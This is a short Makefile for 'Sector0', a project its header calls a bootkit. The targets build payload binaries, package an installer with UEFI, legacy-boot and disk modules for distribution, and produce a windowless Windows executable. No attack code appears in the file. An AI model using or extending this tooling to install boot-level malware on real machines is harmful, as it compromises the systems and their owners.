# Sector0 - Makefile
# Build and package the bootkit

.PHONY: all clean payloads package test

PAYLOADS_DIR = payloads
BUILD_DIR = build

all: payloads

# Build payload binaries
payloads:
	@echo "Building payloads..."
	@chmod +x $(PAYLOADS_DIR)/build.sh
	@cd $(PAYLOADS_DIR) && ./build.sh

# Clean build artifacts
clean:
	@echo "Cleaning..."
	@rm -f $(PAYLOADS_DIR)/*.bin
	@rm -f $(PAYLOADS_DIR)/*.efi
	@rm -f $(PAYLOADS_DIR)/*.o
	@rm -rf $(BUILD_DIR)
	@rm -f *.log

# Package for distribution
package: payloads
	@echo "Packaging..."
	@mkdir -p $(BUILD_DIR)
	@cp installer.py $(BUILD_DIR)/
	@cp config.py $(BUILD_DIR)/
	@cp -r core $(BUILD_DIR)/
	@cp -r $(PAYLOADS_DIR) $(BUILD_DIR)/
	@echo "Package created in $(BUILD_DIR)/"

# Create Windows executable (requires PyInstaller)
exe: payloads
	@echo "Building Windows executable..."
	pyinstaller --onefile --noconsole \
		--add-data "payloads:payloads" \
		--add-data "core:core" \
		--add-data "config.py:." \
		--name sector0 \
		installer.py

# Test syntax
test:
	@echo "Checking Python syntax..."
	@python3 -m py_compile installer.py
	@python3 -m py_compile config.py
	@python3 -m py_compile core/utils.py
	@python3 -m py_compile core/disk.py
	@python3 -m py_compile core/legacy.py
	@python3 -m py_compile core/uefi.py
	@echo "All files OK"
